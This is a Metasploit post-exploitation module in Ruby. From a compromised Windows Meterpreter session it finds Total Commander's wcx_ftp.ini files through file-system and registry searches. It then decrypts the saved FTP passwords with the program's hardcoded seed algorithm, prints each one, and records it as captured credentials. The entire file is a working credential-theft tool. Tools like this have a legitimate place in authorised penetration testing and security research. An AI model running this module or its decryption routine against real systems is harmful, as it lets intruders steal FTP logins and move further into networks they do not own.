# $Id$

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'
require 'rex/parser/ini'


class Metasploit3 < Msf::Post
	include Msf::Post::Windows::Registry
	include Msf::Auxiliary::Report

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Windows Gather Total Commander Saved Password Extraction',
				'Description'   => %q{ This module extracts weakly encrypted
							saved FTP Passwords from Total Commander.
							It finds saved FTP connections in the 
							wcx_ftp.ini file.  },
				'License'       => MSF_LICENSE,
				'Author'        => [ 'TheLightCosine <thelightcosine[at]gmail.com>'],
				'Version'       => '$Revision$',
				'Platform'      => [ 'windows' ],
				'SessionTypes'  => [ 'meterpreter' ]
			))

	end

	def run
		print_status("Checking Default Locations...")
		check_systemroot
		os = session.sys.config.sysinfo['OS']
		drive = session.fs.file.expand_path("%SystemDrive%")
		if os =~ /Windows 7|Vista|2008/
			@appdata = '\\AppData\\Roaming\\'
			@users = drive + '\\Users'
		else
			@appdata = '\\Application Data\\'
			@users = drive + '\\Documents and Settings'
		end
		
		get_users
		@userpaths.each do |path|
			check_userdir(path)
			check_appdata(path)
		end
	
		hklmpath = registry_getvaldata("HKLM\\Software\\Ghisler\\Total Commander", 'FtpIniName')
		case hklmpath
		when nil
			print_status("Total Commander Does not Appear to be Installed Globally")
		when "wcx_ftp.ini"
			print_status("Already Checked SYSTEMROOT")
		when ".\\wcx_ftp.ini"
			hklminstpath = registry_getvaldata("HKLM\\Software\\Ghisler\\Total Commander", 'InstallDir')
			check_other(hklminstpath +'\\wcx_ftp.ini')
		when /APPDATA/
			print_status("Already Checked AppData")
		when /USERPROFILE/
			print_status("Already Checked USERPROFILE")
		else
			check_other(hklmpath)
		end

		registry_enumkeys('HKU').each do |k|
			next unless k.include? "S-1-5-21"
			next if k.include? "_Classes"
			print_status("Looking at Key #{k}")
			hkupath = registry_getvaldata("HKU\\#{k}\\Software\\Ghisler\\Total Commander", 'FtpIniName')
			print_status("HKUP: #{hkupath}")
			case hkupath
			when nil
				print_status("Total Commander Does not Appear to be Installed on This User or we do not have sufficient rights to this user")
			when "wcx_ftp.ini"
				print_status("Already Checked SYSTEMROOT")
			when ".\\wcx_ftp.ini"
				hklminstpath = registry_getvaldata("HKU\\#{k}\\Software\\Ghisler\\Total Commander", 'InstallDir')
				check_other(hklminstpath +'\\wcx_ftp.ini')
			when /APPDATA/
				print_status("Already Checked AppData")
				
			when /USERPROFILE/
				print_status("Already Checked USERPROFILE")
			else
				check_other(hkupath)
			end
		end

	end


	def check_userdir(path)
		filename= "#{path}wcx_ftp.ini"
		begin
			iniexists = client.fs.file.stat(filename)
			print_status("Found File at #{filename}")
			get_ini(filename)			

		rescue
			print_status("#{filename} not found ....")
		end	

	end

	def check_appdata(path)
		filename= "#{path}#{@appdata}\\GHISLER\\wcx_ftp.ini"
		begin
			iniexists = client.fs.file.stat(filename)
			print_status("Found File at #{filename}")
			get_ini(filename)			

		rescue
			print_status("#{filename} not found ....")
		end	

	end

	def check_systemroot
		
		winpath= client.fs.file.expand_path("%SYSTEMROOT%")+'\\wcx_ftp.ini'
		begin
			iniexists = client.fs.file.stat(winpath)
			print_status("Found File at #{winpath}")
			get_ini(winpath)
		rescue
			print_status("#{winpath} not found ....")
		end
		
	end

	def check_other(filename)
		begin
			iniexists = client.fs.file.stat(filename)
			print_status("Found File at #{filename}")
			get_ini(filename)			

		rescue
			print_status("#{filename} not found ....")
		end	
	end

	
	def get_users
		@userpaths=[]
		session.fs.dir.foreach(@users) do |path|
			next if path =~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/
			@userpaths << "#{@users}\\#{path}\\"
		end

		

	end


	def get_ini(filename)
		config = client.fs.file.new(filename,'r')
		parse = config.read
		ini=Rex::Parser::Ini.from_s(parse)

		ini.each_key do |group|
			next if group=="General" or group == "default" or group=="connections"
			print_status("Processing Saved Session #{group}")
			host = ini[group]['host']
			
			username = ini[group]['username']
			passwd = ini[group]['password']
			next if passwd==nil
			passwd = decrypt(passwd)
			(host,port) = host.split(':')
			port=21 if port==nil
			print_good("*** Host: #{host} Port: #{port} User: #{username}  Password: #{passwd} ***")
			report_auth_info(
						:host  => host,
						:port => port,
						:sname => 'FTP',
						:user => username,
						:pass => passwd
					)
	
		end

	end	

	def seed(nMax)
		@vseed = ((@vseed * 0x8088405) & 0xffffffff) +1 
		return (((@vseed * nMax) >> 32)& 0xffffffff)
	end

	def shift(n1, n2)
		first= (n1 << n2) & 0xffffffff
		second = (n1 >> (8 - n2)) & 0xffffffff	
		retval= (first | second) &  0xff
		return retval
	end

	def decrypt(pwd)

		pwd2=[]

		pwd.scan(/../) { |a| pwd2 << (a.to_i 16) }

		len= (pwd2.length) -4

		pwd3=[]
		@vseed = 849521
		pwd2.each do |a| 
			blah = seed(8)
			blah2 = shift(a, blah)
			pwd3 << blah2
		end

		@vseed =12345
		(0..255).each do |i|
			a=seed(len)
			b=seed(len)
			t=pwd3[a]
			pwd3[a] = pwd3[b]	
			pwd3[b]=t
		end


		@vseed =42340
		(0..len).each do |i|
			pwd3[i] = (pwd3[i] ^ seed(256)) & 0xff
		end


		@vseed =54321
		(0..len).each do |i|
			foo = seed(256)
			pwd3[i] =  (pwd3[i] - foo) & 0xff
		end


		fpwd=""
		pwd3[0,len].map{|a| fpwd << a.chr}
		return fpwd

	end
end
